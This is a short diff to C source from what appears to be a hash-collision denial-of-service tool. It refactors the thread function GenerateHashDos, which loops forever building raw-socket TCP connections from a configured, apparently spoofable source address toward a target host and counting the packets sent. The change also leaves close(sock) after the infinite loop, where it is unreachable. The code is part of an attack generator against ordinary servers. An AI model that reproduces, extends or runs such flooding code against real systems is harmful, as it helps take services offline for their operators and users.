@@ -35,6 +35,7 @@ void HashDosPrintUsage(void)
 void *GenerateHashDos(void *data)
 {
   int thread_id = *((int *)data);
+  int sock = MakeRawSocket(IPPROTO_TCP);
   while (1) {
     // *** begin of critical section ***
     pthread_mutex_lock(&g_hash_dos_mutex);
@@ -52,10 +53,10 @@ void *GenerateHashDos(void *data)
     }
     // make socket
     int src_port, seq, ack;
-    int sock;
 
-    sock =  MakeTcpConnection(
-        inet_addr(g_hash_dos_now.src),
+    MakeTcpConnection(
+	sock,    
+    	inet_addr(g_hash_dos_now.src),
         inet_addr(g_hash_dos_now.dest),
         &src_port,
         g_hash_dos_now.port,
@@ -73,11 +74,12 @@ void *GenerateHashDos(void *data)
         seq,
         ack,
         0);
-    close(sock);
+   
     g_hash_dos_num_generated_in_sec++;
     g_hash_dos_num_total++;
     pthread_mutex_unlock(&g_hash_dos_mutex);
   }
+ close(sock);
   return NULL;
 }
 
